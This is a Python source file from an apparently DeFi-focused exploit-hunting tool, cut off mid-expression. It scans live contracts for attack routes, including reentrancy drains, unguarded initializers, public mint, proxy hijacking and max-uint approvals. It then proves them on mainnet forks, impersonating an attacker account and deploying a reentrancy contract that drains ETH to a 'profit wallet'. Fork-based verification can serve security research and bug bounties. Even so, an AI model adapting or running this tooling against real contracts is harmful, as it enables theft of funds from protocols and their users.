"""Attack simulator — fork-based simulation"""
import subprocess
from typing import Dict, List, Optional

from defihunter.core import abi as abi_util

def run(cmd: str, timeout: int = 60) -> str:
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return result.stdout.strip()

class AttackSimulator:
    def __init__(self, rpc_url: Optional[str] = None, block: Optional[int] = None):
        self.rpc_url = rpc_url or 'http://localhost:8545'
        self.block = block
    
    def run(self, attack_type: str, target: str) -> Dict:
        """Run attack simulation"""
        if attack_type == 'inflation':
            return self._simulate_inflation(target)
        elif attack_type == 'admin':
            return self._simulate_admin(target)
        elif attack_type == 'governance':
            return self._simulate_governance(target)
        elif attack_type == 'oracle':
            return self._simulate_oracle(target)
        elif attack_type == 'reentrancy':
            return self._simulate_reentrancy(target)
        elif attack_type == 'bridge':
            return self._simulate_bridge(target)
        elif attack_type == 'sandwich':
            return self._simulate_sandwich(target)
        elif attack_type == 'twap':
            return self._simulate_twap(target)
        elif attack_type == 'flashloan':
            return self._simulate_flashloan(target)
        elif attack_type == 'withdraw':
            return self._simulate_withdraw(target)
        elif attack_type == 'initialize':
            return self._simulate_initialize(target)
        elif attack_type == 'permit':
            return self._simulate_permit(target)
        elif attack_type == 'liquidation':
            return self._simulate_liquidation(target)
        elif attack_type == 'forcesend':
            return self._simulate_forcesend(target)
        elif attack_type == 'peg':
            return self._simulate_peg(target)
        elif attack_type == 'crossfunc':
            return self._simulate_crossfunc(target)
        elif attack_type == 'delegatecall':
            return self._simulate_delegatecall(target)
        elif attack_type == 'mint':
            return self._simulate_mint(target)
        else:
            return {'success': False, 'error': f'Unknown attack type: {attack_type}'}
    
    def _simulate_inflation(self, target: str) -> Dict:
        """Simulate inflation attack"""
        steps = []
        
        # Read initial state
        ts = run(f'cast call {target} "totalSupply()(uint256)" --rpc-url {self.rpc_url} 2>/dev/null')
        steps.append({'step': 'Initial totalSupply', 'value': ts})
        
        # Check if deposit function exists
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_deposit = '6e553f65' in code or 'b6b55f25' in code
        
        if has_deposit:
            steps.append({'step': 'Deposit function found', 'value': 'vulnerable'})
            return {
                'success': True,
                'steps': steps,
                'profit': 'Variable (depends on victim deposit)',
                'description': 'First depositor can inflate share price via donation',
            }
        else:
            return {
                'success': False,
                'steps': steps,
                'error': 'No standard deposit function found',
            }
    
    def _simulate_admin(self, target: str) -> Dict:
        """Simulate admin key compromise"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        
        has_admin = any(s in code for s in ['bf353dbb', '65fae35e', '9c52a7f1'])
        has_file = '4c929902' in code
        has_drip = 'd370ff70' in code
        
        if has_admin:
            return {
                'success': True,
                'steps': [
                    {'step': 'Admin function found', 'value': 'wards/rely/deny'},
                    {'step': 'File function found', 'value': str(has_file)},
                    {'step': 'Drip function found', 'value': str(has_drip)},
                ],
                'profit': 'All funds in contract',
                'description': 'Admin can drain all value via file() + drip()',
            }
        return {'success': False, 'error': 'No admin functions detected'}
    
    def _simulate_governance(self, target: str) -> Dict:
        """Simulate flash loan governance attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        
        has_votes = any(s in code for s in ['getVotes', 'getPriorVotes', 'delegates'])
        
        if has_votes:
            return {
                'success': True,
                'description': 'Token has voting — check for snapshot protection',
            }
        return {'success': False, 'error': 'No voting functions detected'}
    
    def _simulate_oracle(self, target: str) -> Dict:
        """Simulate oracle manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Chainlink-style getPrice / getAssetPrice selector-ish markers
        has_price = any(s in code for s in ['50d25bcd', 'b1c5e427', '4b43f4a4'])  # latestAnswer / getPrice / update
        if has_price:
            return {
                'success': True,
                'steps': [
                    {'step': 'Price oracle functions found', 'value': 'queryable'},
                    {'step': 'Check data source', 'value': 'DEX spot or TWAP?'},
                ],
                'profit': 'Depends on depth of DEX liquidity',
                'description': 'If oracle reads DEX spot price, a flash-loan swap can manipulate it',
            }
        return {'success': False, 'error': 'No price oracle functions detected'}

    def _simulate_reentrancy(self, target: str) -> Dict:
        """Simulate reentrancy attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Check for common reentrancy hooks: ERC777 tokensReceived, onFlashLoan, withdraw
        has_hooks = any(s in code for s in ['e3a4da69', '5cffe9de', '3ccfd60b'])  # tokensReceived / flashLoan / withdraw
        if has_hooks:
            return {
                'success': True,
                'steps': [
                    {'step': 'External callbacks found', 'value': 'tokensReceived/onFlashLoan'},
                    {'step': 'Check for ReentrancyGuard', 'value': 'missing? (simulate)'},
                ],
                'profit': 'All funds in pool',
                'description': 'External callback before state update allows recursive drain',
            }
        return {'success': False, 'error': 'No reentrancy hooks detected'}

    def _simulate_bridge(self, target: str) -> Dict:
        """Simulate bridge deposit spoof"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # mint selector + finalize/flush selectors
        has_mint = 'a0712d68' in code
        has_finalize = any(s in code for s in ['20dd9f18', '0ecbd0b7', '0b37eb8b'])  # finalizeDeposit variants
        if has_mint or has_finalize:
            return {
                'success': True,
                'steps': [
                    {'step': 'Mint function found', 'value': str(has_mint)},
                    {'step': 'Finalize/deposit function found', 'value': str(has_finalize)},
                    {'step': 'Check proof verification', 'value': 'signatures/oracle required?'},
                ],
                'profit': 'Unbounded (all bridge collateral)',
                'description': 'Bridge mint without proper proof verification lets attacker fabricate deposits',
            }
        return {'success': False, 'error': 'No bridge mint/finalize functions detected'}

    def _simulate_sandwich(self, target: str) -> Dict:
        """Simulate MEV sandwich — informational, needs mempool"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_swap = '022c0d9f' in code  # swap(uint256,uint256,address,bytes)
        if has_swap:
            return {
                'success': True,
                'steps': [
                    {'step': 'AMM pair found (swap selector)', 'value': 'sandwichable'},
                    {'step': 'Requires mempool access', 'value': 'flashbots/private mempool'},
                ],
                'profit': 'Slippage captured from victim',
                'description': 'Front-run + back-run around victim swap to extract value',
            }
        return {'success': False, 'error': 'No AMM swap function detected'}

    def _simulate_twap(self, target: str) -> Dict:
        """Simulate TWAP oracle manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # UniswapV2 pair TWAP: observe / consult / price0CumulativeLast
        has_twap = any(s in code for s in ['883bdbfd', 'c22cee0b', '5e76e5d4'])  # observe / consult / price0CumulativeLast
        if has_twap:
            return {
                'success': True,
                'steps': [
                    {'step': 'TWAP functions found', 'value': 'check window length'},
                    {'step': 'Short window?', 'value': 'manipulable via flash loan'},
                ],
                'profit': 'Depends on protocol trusting TWAP',
                'description': 'TWAP with short observation window can be moved with a flash loan',
            }
        return {'success': False, 'error': 'No TWAP functions detected'}

    def _simulate_flashloan(self, target: str) -> Dict:
        """Simulate flash loan reentrancy combo"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_flash = '5cffe9de' in code  # flashLoan(address,address,uint256,bytes)
        if has_flash:
            return {
                'success': True,
                'steps': [
                    {'step': 'FlashLoan function found', 'value': 'capital source available'},
                    {'step': 'Chain with reentrancy', 'value': 'see reentrancy_attack'},
                ],
                'profit': 'All funds in pool',
                'description': 'Flash loan funds the reentrancy drain with zero upfront capital',
            }
        return {'success': False, 'error': 'No flashLoan function detected'}

    def _simulate_withdraw(self, target: str) -> Dict:
        """Simulate withdraw front-run / share price manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # ERC-4626: convertToAssets / previewRedeem / redeem
        has_4626 = any(s in code for s in ['07a2d13a', '4cdad506', 'ba087652', 'd905777e'])
        if has_4626:
            return {
                'success': True,
                'steps': [
                    {'step': 'ERC-4626 functions found', 'value': 'convertToAssets/redeem'},
                    {'step': 'Rounding direction exploitable?', 'value': 'simulate with 1 wei units'},
                ],
                'profit': 'Small per victim; scales with volume',
                'description': 'Share price rounding / moves can be front-run to victimize large withdraws',
            }
        return {'success': False, 'error': 'No ERC-4626 functions detected'}

    def _simulate_initialize(self, target: str) -> Dict:
        """Simulate unguarded initializer on upgradeable proxy"""
        # Check EIP-1967 implementation slot
        impl = run(f'cast storage {target} 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url {self.rpc_url} 2>/dev/null')
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_init = '1cf5d2a8' in code or 'fe4b84df' in code  # initialize() / initialize(address)
        if impl and impl != '0x' and has_init:
            return {
                'success': True,
                'steps': [
                    {'step': 'EIP-1967 proxy detected', 'value': impl[:42]},
                    {'step': 'initialize() present', 'value': 'check if already initialized'},
                ],
                'profit': 'Full contract takeover',
                'description': 'Unguarded initialize() on a proxy allows first-caller ownership takeover',
            }
        return {'success': False, 'error': 'Not an upgradeable proxy with initialize(), or already initialized'}

    def _simulate_permit(self, target: str) -> Dict:
        """Simulate cross-chain permit replay"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_permit = 'd505accf' in code  # permit(owner,spender,value,deadline,v,r,s)
        if has_permit:
            return {
                'success': True,
                'steps': [
                    {'step': 'EIP-2612 permit found', 'value': 'check domain separator'},
                    {'step': 'ChainId in domain?', 'value': 'if missing -> cross-chain replay'},
                ],
                'profit': 'Victim allowance on multiple chains',
                'description': 'Permit signatures replayable across chains if domain separator omits chainId',
            }
        return {'success': False, 'error': 'No permit function detected'}

    def _simulate_liquidation(self, target: str) -> Dict:
        """Simulate liquidation race"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_liq = '69ab90df' in code  # liquidate(address,uint256,address,address)
        if has_liq:
            return {
                'success': True,
                'steps': [
                    {'step': 'liquidate() found', 'value': 'liquidation bonus claimable'},
                    {'step': 'Health monitoring required', 'value': 'front-run on health drop'},
                ],
                'profit': 'Liquidation bonus per position',
                'description': 'Race/front-run liquidations to capture the bonus before others',
            }
        return {'success': False, 'error': 'No liquidate function detected'}

    def _simulate_forcesend(self, target: str) -> Dict:
        """Simulate forced ETH send breaking accounting"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Does the vault use balanceOf(address(this))? Heuristic: ERC-4626 totalAssets
        has_assets = '01e1d114' in code  # totalAssets()
        if has_assets:
            return {
                'success': True,
                'steps': [
                    {'step': 'totalAssets() found', 'value': 'check internal vs balanceOf'},
                    {'step': 'selfdestruct force-send', 'value': 'inflates share price'},
                ],
                'profit': 'Share price inflation',
                'description': 'Force-sent ETH (selfdestruct/coinbase) inflates balance-based share price',
            }
        return {'success': False, 'error': 'No totalAssets() function detected'}

    def _simulate_peg(self, target: str) -> Dict:
        """Simulate stablecoin collateral swap attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_vault = '5b6fc7a8' in code  # openVault()
        has_swap = any(s in code for s in ['76cc7a9a', '0f7ee467'])  # swapCollateral variants
        if has_vault and has_swap:
            return {
                'success': True,
                'steps': [
                    {'step': 'Vault open + collateral swap found', 'value': 'check price source'},
                    {'step': 'Combine with twap/oracle attack', 'value': 'mint > backing'},
                ],
                'profit': 'Minted stablecoin minus collateral cost',
                'description': 'Collateral swap at distorted price lets attacker mint unbacked stablecoin',
            }
        return {'success': False, 'error': 'No collateral swap / vault functions detected'}

    def _simulate_crossfunc(self, target: str) -> Dict:
        """Simulate cross-function reentrancy (withdraw sends before state update)"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_withdraw_balance = '5fd8c710' in code  # withdrawBalance()
        has_transfer = '56a6d9ef' in code  # transferBalance(address,uint256)
        if has_withdraw_balance and has_transfer:
            return {
                'success': True,
                'steps': [
                    {'step': 'withdrawBalance() sends before zeroing', 'value': 'reentrant receive() hook'},
                    {'step': 're-enter transferBalance()', 'value': 'double-credit funds to second account'},
                ],
                'profit': 'Withdrawal + transferred balance (value from thin air)',
                'description': 'Cross-function reentrancy: state updated after the external call in one function, other function unprotected',
            }
        return {'success': False, 'error': 'No cross-function reentrancy surface detected'}

    def _simulate_delegatecall(self, target: str) -> Dict:
        """Simulate arbitrary delegatecall via unauthenticated proxy upgrade"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_set_impl = 'd784d426' in code  # setImplementation(address)
        if has_set_impl:
            return {
                'success': True,
                'steps': [
                    {'step': 'setImplementation(address) found', 'value': 'check access control'},
                    {'step': 'Point proxy at attacker contract', 'value': 'delegatecall runs in proxy context'},
                    {'step': 'Steal proxy ETH / overwrite storage', 'value': 'layout collision or balance sweep'},
                ],
                'profit': 'Full proxy ETH balance + storage takeover',
                'description': 'Unauthenticated proxy upgrade allows arbitrary delegatecall',
            }
        return {'success': False, 'error': 'No setImplementation / proxy upgrade path detected'}

    def _simulate_mint(self, target: str) -> Dict:
        """Simulate permissionless mint (missing access control)"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_mint = '40c10f19' in code  # mint(address,uint256)
        if has_mint:
            return {
                'success': True,
                'steps': [
                    {'step': 'public mint(address,uint256) found', 'value': 'call it directly'},
                    {'step': 'Mint unlimited supply to attacker', 'value': 'dilute holders'},
                    {'step': 'Dump minted tokens', 'value': 'swap for real assets'},
                ],
                'profit': 'Unlimited token supply minted for free',
                'description': 'Token mint() lacks onlyOwner/minter role check',
            }
        return {'success': False, 'error': 'No public mint(address,uint256) detected'}

# ---------------------------------------------------------------------------
# ForkSimulator — REAL fork verification (anvil + cast).
# Static analysis says "possible"; an eth_call from an arbitrary attacker
# account on a mainnet fork says "provable". Degrades gracefully when the
# foundry binaries or an RPC URL are unavailable — the wizard keeps running.
# ---------------------------------------------------------------------------

class ForkSimulator:
    """Context manager: boot an anvil fork, prove callable-by-anyone
    findings with real eth_call, tear the fork down on exit.

    Usage:
        with ForkSimulator(rpc_url="https://eth-mainnet...") as fork:
            if not fork.available:
                print(fork.why_not)
            fork.run("mint", "0x1234...")
    """

    def __init__(self, rpc_url: Optional[str] = None, block: Optional[int] = None,
                 port: Optional[int] = None, attacker: Optional[str] = None,
                 profit_wallet: Optional[str] = None):
        self.rpc_url = rpc_url
        self.block = block
        self.port = port or self._free_port()
        self.proc = None
        self.available = False
        self.why_not = ""
        self._live = None  # LiveFork instance (when using live RPC)
        self.attacker = attacker or "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
        self.profit_wallet = profit_wallet or self.attacker
        self._abi: List[Dict] = []
        self._attack_candidates: List[tuple] = []

    # Function names that carry each attack route. The ABI tells us the REAL
    # signature with the REAL input types — no more selector guessing.
    ATTACK_FN_NAMES = {
        "mint": ["mint", "mintTo", "mintToken"],
        "initialize": ["initialize", "init"],
        "delegatecall": ["upgradeTo", "upgrade", "setImplementation",
                         "setTarget", "changeImplementation",
                         "updateImplementation", "setLogic"],
        "reentrancy": ["withdraw", "withdrawTo", "claim", "redeem", "unstake",
                       "harvest", "withdrawAll", "emergencyWithdraw"],
        "arbitrarycall": ["execute", "call", "exec", "performAction",
                          "governanceCall", "forward", "execute3"],
        "approve": ["approve", "setApprovalForAll", "increaseAllowance"],
        "selfdestruct": ["selfdestruct", "kill", "destroy", "die",
                         "killMe", "close"],
        "oracle": ["getAmountsOut", "getAmountsIn", "quote",
                   "getReserves", "slot0", "latestAnswer", "getPrice"],
        "flashloan": ["flashLoan", "flashLoanSimple", "flash"],
        "governance": ["propose", "queue", "execute", "castVote",
                       "getVotes", "getPastVotes", "delegate"],
        "bridge": ["mint", "mintTo", "finalizeDeposit", "finalize",
                   "deposit", "processMessage"],
        "twap": ["observe", "consult", "price0CumulativeLast",
                 "cardinality", "observationLength"],
        "crossfunc": ["withdrawBalance", "transferBalance", "withdraw",
                      "transfer"],
        "permit": ["permit", "DOMAIN_SEPARATOR", "nonces"],
        "liquidation": ["liquidate", "liquidationCall", "seize"],
        "forcesend": ["totalAssets", "convertToShares", "convertToAssets"],
        "peg": ["openVault", "swapCollateral", "mintDai", "redeem"],
        "sandwich": ["swap", "swapExactTokensForTokens", "swapTokensForExactTokens",
                     "swapExactETHForTokens", "swapETHForExactTokens",
                     "swapExactTokensForETH", "swapTokensForExactETH"],
        "frontrun": ["liquidate", "liquidationCall", "auction", "bid",
                     "withdraw", "claim", "compound", "deposit"],
        "mev": ["swap", "liquidate", "liquidationCall", "auction", "bid"],
    }
    MAX_UINT = ("11579208923731619542357098500868790785326998466564056403"
                "9457584007913129639935")

    def _abi_candidates(self, attack: str) -> List[tuple]:
        """(signature, args) pairs for functions in the REAL ABI that map to
        this attack route. Empty when the ABI is unknown or has no match —
        callers fall back to the hardcoded guess battery."""
        out = []
        for fn in abi_util.functions(self._abi):
            name = fn.get("name", "")
            if name not in self.ATTACK_FN_NAMES.get(attack, ()):
                continue
            args = []
            for inp in fn.get("inputs", []):
                t = inp.get("type", "")
                if t == "address":
                    args.append(self.attacker)
                elif t.startswith("uint"):
                    if attack == "approve":
                        args.append(self.MAX_UINT)
                    elif attack == "reentrancy":
                        args.append("1")  # 1 wei — avoids balance limits
                    else:
                        args.append("1000000")
                elif t == "bool":
                    args.append("true")
                elif t == "bytes":
                    args.append("0x" + "00" * 4)
                elif t == "string":
                    args.append("")
                else:
                    args.append("0")
            out.append((abi_util.canonical(fn), args))
        return out

    def _merge_candidates(self, hardcoded: List[tuple]) -> List[tuple]:
        """ABI-derived candidates first; hardcoded guesses only when the ABI
        did not already give us that exact signature."""
        abi_sigs = {sig for sig, _ in self._attack_candidates}
        return (self._attack_candidates
                + [c for c in hardcoded if c[0] not in abi_sigs])

    @staticmethod
    def _free_port() -> int:
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 0))
            return s.getsockname()[1]

    def _has_tool(self, name: str) -> bool:
        import shutil
        return shutil.which(name) is not None

    def __enter__(self) -> "ForkSimulator":
        # ---- Strategy 1: Live fork (fast, no Anvil, no Foundry) ----
        # eth_call with state overrides against the real mainnet RPC.
        # Zero startup time, works with any RPC endpoint.
        if self.rpc_url and "http" in self.rpc_url:
            try:
                from defihunter.core.live_fork import LiveFork
                lf = LiveFork(self.rpc_url, block=self.block,
                              attacker=self.attacker)
                lf.__enter__()
                if lf.available:
                    self._live = lf
                    self.available = True
                    self.why_not = ""
                    return self
            except Exception:
                pass  # fall through to Anvil

        # ---- Strategy 2: Anvil fork (requires foundry) ----
        if not self._has_tool("anvil") or not self._has_tool("cast"):
            self.why_not = ("Fork verification skipped: live RPC unavailable "
                            "and foundry binaries (anvil/cast) not on PATH.")
            return self
        import subprocess as sp
        cmd = ["anvil", "--port", str(self.port), "--silent"]
        if self.rpc_url and "http" in self.rpc_url:
            cmd += ["--fork-url", self.rpc_url]
            if self.block:
                cmd += ["--fork-block-number", str(self.block)]
        try:
            self.proc = sp.Popen(cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        except OSError as e:
            self.why_not = f"Fork verification skipped: could not start anvil ({e})."
            return self
        if self._wait_ready(40):
            self.available = True
        else:
            self.why_not = "Fork verification skipped: anvil fork did not become ready."
            self.__exit__(None, None, None)
        return self

    def _wait_ready(self, timeout: int = 40) -> bool:
        import time
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                out = subprocess.run(
                    ["cast", "block-number", "--rpc-url", self.rpc_url_local],
                    capture_output=True, text=True, timeout=5,
                )
                if out.returncode == 0 and out.stdout.strip().isdigit():
                    return True
            except Exception:
                pass
            time.sleep(1)
        return False

    @property
    def rpc_url_local(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    def _call(self, selector: str, args: List[str], extra_from: bool = True) -> Dict:
        # Live fork mode: delegate to LiveFork
        if self._live and self._live.available:
            r = self._live.call_raw(self._target, selector, args,
                                     from_addr=self.attacker if extra_from else None)
            return {"ok": r["ok"], "stdout": r.get("return") or "",
                    "stderr": r.get("error", "")}
        # Anvil fallback
        cmd = ["cast", "call", self._target, selector, *args,
               "--rpc-url", self.rpc_url_local]
        if extra_from:
            cmd += ["--from", self.attacker]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip()}

    def _read(self, selector: str) -> str:
        """Read a state variable (no from-address needed for view reads)."""
        if self._live and self._live.available:
            r = self._live.call_raw(self._target, selector)
            return r.get("return") or ""
        proc = subprocess.run(
            ["cast", "call", self._target, selector, "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        return proc.stdout.strip() or proc.stderr.strip()

    def _fund_attacker(self) -> bool:
        """Give the attacker 2 ETH on the fork so real sends can pay gas.

        Live fork: the balance is overridden in eth_call — no funding needed.
        Anvil fork: impersonate + setBalance.
        """
        if self._live and self._live.available:
            return True  # LiveFork handles balance via state overrides
        imp = subprocess.run(
            ["cast", "rpc", "anvil_impersonateAccount", self.attacker,
             "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        if imp.returncode != 0:
            return False
        proc = subprocess.run(
            ["cast", "rpc", "anvil_setBalance", self.attacker,
             "0x1BC16D674EC80000", "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        return proc.returncode == 0

    def _has_code(self, addr: Optional[str] = None) -> bool:
        addr = addr or getattr(self, "_target", "") or ""
        if self._live and self._live.available:
            return self._live.has_code(addr)
        proc = subprocess.run(
            ["cast", "code", addr, "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        out = proc.stdout.strip().lower()
        return bool(out and out not in ("0x", "0x0"))

    def _balance(self, addr: str) -> str:
        """Raw wei ETH balance of an address on the fork (eth_getBalance).

        Live fork: reads real chain balance via eth_getBalance.
        Anvil fork: cast balance.
        """
        if self._live and self._live.available:
            bal = self._live.get_balance(addr)
            return str(bal)
        try:
            proc = subprocess.run(
                ["cast", "balance", addr, "--rpc-url", self.rpc_url_local],
                capture_output=True, text=True, timeout=30)
        except FileNotFoundError:
            return ""
        return proc.stdout.strip() or proc.stderr.strip()

    @staticmethod
    def _to_int(value) -> Optional[int]:
        """Parse a wei/uint value from cast output.

        `cast balance` prints DECIMAL wei; `cast call` prints HEX. A read
        failure (empty/error string) must NOT be treated as zero — return
        None so the caller fails closed instead of proving a false change.
        """
        try:
            s = str(value or "").strip() or "0"
            if s.lower().startswith("0x"):
                return int(s, 16)
            return int(s)
        except (ValueError, TypeError):
            return None

    def _send(self, selector: str, args: List[str]) -> Dict:
        """Simulate a state-changing tx from the attacker.

        Live fork: eth_call with state overrides (attacker gets 100 ETH).
        If the call succeeds → the exploit is real (no revert = callable by anyone).
        Anvil fork: cast send --unlocked + receipt status check.
        """
        if self._live and self._live.available:
            r = self._live.call_with_override(
                self._target, selector, args, attacker=self.attacker)
            return {"ok": r["ok"], "stdout": r.get("return") or "",
                    "stderr": r.get("revert") or ""}
        # Anvil fallback
        if not self._fund_attacker():
            return {"ok": False, "stdout": "", "stderr": "could not fund attacker"}
        cmd = ["cast", "send", "--unlocked", self._target, selector, *args,
               "--from", self.attacker, "--rpc-url", self.rpc_url_local]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        txhash = ""
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                if line.lower().startswith("transactionhash"):
                    txhash = line.split()[1].strip()
                    break
        mined = proc.returncode == 0 and (not txhash or self._mined(txhash))
        return {"ok": mined, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip(), "txhash": txhash}

    def _send_to(self, addr: str, selector: str, args: List[str],
                 value: Optional[str] = None,
                 gas_limit: Optional[str] = None) -> Dict:
        """State-changing tx to an ARBITRARY contract (not just the target)."""
        if self._live and self._live.available:
            r = self._live.call_with_override(
                addr, selector, args, attacker=self.attacker, value=value)
            return {"ok": r["ok"], "stdout": r.get("return") or "",
                    "stderr": r.get("revert") or ""}
        if not self._fund_attacker():
            return {"ok": False, "stdout": "", "stderr": "could not fund attacker"}
        cmd = ["cast", "send", "--unlocked", addr, selector, *args,
               "--from", self.attacker, "--rpc-url", self.rpc_url_local]
        if value:
            cmd += ["--value", value]
        if gas_limit:
            cmd += ["--gas-limit", gas_limit]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        txhash = ""
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                if line.lower().startswith("transactionhash"):
                    txhash = line.split()[1].strip()
                    break
        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip(), "txhash": txhash}

    def _mined(self, txhash: str) -> bool:
        """True when a tx MINED with status 1 (cast send rc alone does not
        distinguish reverted-but-mined transactions)."""
        if not txhash:
            return False
        proc = subprocess.run(
            ["cast", "receipt", txhash, "status", "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        return "true" in proc.stdout.strip().lower()

    def _call_on(self, addr: str, selector: str, args: List[str]) -> Dict:
        """eth_call against an arbitrary contract (no state change)."""
        cmd = ["cast", "call", addr, selector, *args,
               "--rpc-url", self.rpc_url_local]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip()}

    def _deploy(self, bytecode: str, constructor_types: Optional[List[str]] = None,
                constructor_args: Optional[List[str]] = None) -> Dict:
        """Deploy bytecode on the fork from the attacker EOA.

        Returns {'ok', 'address', 'stderr'}. Constructor args (if any) are
        passed as a "constructor(...)" signature + args — cast appends the
        ABI encoding itself (manually appending to the initcode makes the
        CREATE revert with empty data).
        """
        if not self._fund_attacker():
            return {"ok": False, "address": "", "stderr": "could not fund attacker"}
        cmd = ["cast", "send", "--unlocked", "--from", self.attacker,
               "--rpc-url", self.rpc_url_local, "--json",
               "--create", "0x" + bytecode]
        if constructor_types and constructor_args:
            cmd += [f"constructor({','.join(constructor_types)})",
                    *constructor_args]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        if proc.returncode != 0:
            return {"ok": False, "address": "", "stderr": proc.stderr.strip()[:300]}
        try:
            import json
            data = json.loads(proc.stdout)
            addr = (data.get("contractAddress")
                    or (data.get("receipt") or {}).get("contractAddress")
                    or "")
            return {"ok": bool(addr), "address": addr,
                    "stderr": "" if addr else proc.stdout[:200]}
        except Exception:
            return {"ok": False, "address": "", "stderr": proc.stdout[:200]}

    def _abi_encode(self, types: List[str], args: List[str]) -> str:
        proc = subprocess.run(
            ["cast", "abi-encode", f"encode({','.join(types)})", *args],
            capture_output=True, text=True, timeout=30)
        return proc.stdout.strip() if proc.returncode == 0 else ""

    def _sig_selector(self, sig: str) -> str:
        proc = subprocess.run(["cast", "sig", sig],
                              capture_output=True, text=True, timeout=30)
        return proc.stdout.strip() if proc.returncode == 0 else ""

    def prove_reentrancy(self, target: str, payout_sig: str = "withdraw(uint256)",
                         amount: str = "1", demo: bool = False,
                         profit_wallet: Optional[str] = None) -> Dict:
        """One-block exploit chain: deploy a ReentrancyAttacker whose fallback
        re-enters the victim's payout, seed a deposit, fire the chain, and
        read the state diff (reentries + victim ETH before → after).

        CONFIRMED — the drain chain actually executed: reentries > 1 and the
                    victim's ETH balance decreased.
        UNVERIFIED — compiler missing / deploy failed / chain reverted: the
                    window may still exist but we could NOT demonstrate a drain.
        """
        if not self.available:
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": self.why_not, "attack": "reentrancy",
                    "target": target}
        from defihunter.core import attacker
        art = attacker.get_contract("ReentrancyAttacker")
        if not art.get("bytecode"):
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": "attacker contract compile unavailable (solc not found)",
                    "attack": "reentrancy", "target": target}
        if not self._has_code(target):
            return {"success": False, "verdict": "REFUTED",
                    "evidence": "target has no bytecode on this fork",
                    "attack": "reentrancy", "target": target}

        # payload = selector + encoded args of the payout call
        sel = self._sig_selector(payout_sig)
        sig_parts = payout_sig.split("(")[1].rstrip(")") if "(" in payout_sig else ""
        arg_types = [t.strip() for t in sig_parts.split(",") if t.strip()]
        arg_enc = self._abi_encode(arg_types, [amount]) if arg_types else ""
        payload = ""
        if sel and (not arg_types or arg_enc):
            payload = sel + (arg_enc[2:] if arg_enc.startswith("0x") else arg_enc)
        if not payload:
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": f"could not encode payload for {payout_sig}",
                    "attack": "reentrancy", "target": target}

        owner = profit_wallet or self.profit_wallet
        dep = self._deploy(art["bytecode"],
                           ["address", "address", "bytes"],
                           [target, owner, payload])
        if not dep.get("ok"):
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": f"attacker deploy failed: {dep.get('stderr', '')[:120]}",
                    "attack": "reentrancy", "target": target}
        attacker_addr = dep["address"]

        # attacker deposits 1 ETH into the victim (victim records
        # balances[attacker_contract] = 1 ETH)
        seed = self._send_to(attacker_addr, "depositIntoVictim()", [],
                             value="1ether")
        if not seed["ok"]:
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": f"could not seed deposit: {seed['stderr'][:120]}",
                    "attack": "reentrancy", "target": target}
        # baseline AFTER seeding — the drain must move ETH out of the victim
        seeded = self._balance(target)

        # fire the drain chain with a generous gas limit (each re-entry costs
        # ~10k gas; default estimate may be too low to show the loop)
        chain = self._send_to(attacker_addr, "go()", [], gas_limit="30000000")
        chain_mined = chain["ok"] and self._mined(chain.get("txhash", ""))
        reentries = self._call_on(attacker_addr, "reentries()", [])
        after = self._balance(target)

        steps = [
            {"step": "deployed ReentrancyAttacker", "value": attacker_addr},
            {"step": "attacker deposited 1 ETH into victim", "value": "seeded"},
            {"step": "go() drain chain",
             "value": "mined, status 1 ✅" if chain_mined
